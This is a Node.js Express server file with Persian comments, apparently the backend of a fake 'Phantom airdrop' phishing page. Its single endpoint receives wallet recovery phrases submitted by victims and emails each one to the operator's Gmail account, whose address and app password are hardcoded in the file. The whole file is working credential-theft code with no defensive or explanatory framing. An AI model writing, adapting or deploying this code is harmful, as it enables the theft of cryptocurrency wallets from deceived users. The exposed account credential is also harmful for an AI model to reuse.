const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const app = express();

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// تنظیم Nodemailer
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'phantomairdrop3@gmail.com', // ایمیل شما
        pass: 'kfbh iosz ryii fmzl'        // App Password که دریافت کردید
    }
});

// مسیری برای ارسال اطلاعات
app.post('/send-recovery', (req, res) => {
    const { recoveryPhrase } = req.body;

    // ایمیل ارسال اطلاعات
    const mailOptions = {
        from: 'phantomairdrop3@gmail.com', // ایمیل ارسال‌کننده
        to: 'phantomairdrop3@gmail.com',  // ایمیل دریافت‌کننده (ایمیل خودتان)
        subject: 'Recovery Phrase Received',
        text: `A new recovery phrase was submitted: \n\n${recoveryPhrase}`
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error('Error sending email:', error);
            res.status(500).send('Failed to send recovery phrase.');
        } else {
            console.log('Email sent: ' + info.response);
            res.status(200).send('Recovery phrase sent successfully!');
        }
    });
});

// راه‌اندازی سرور
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
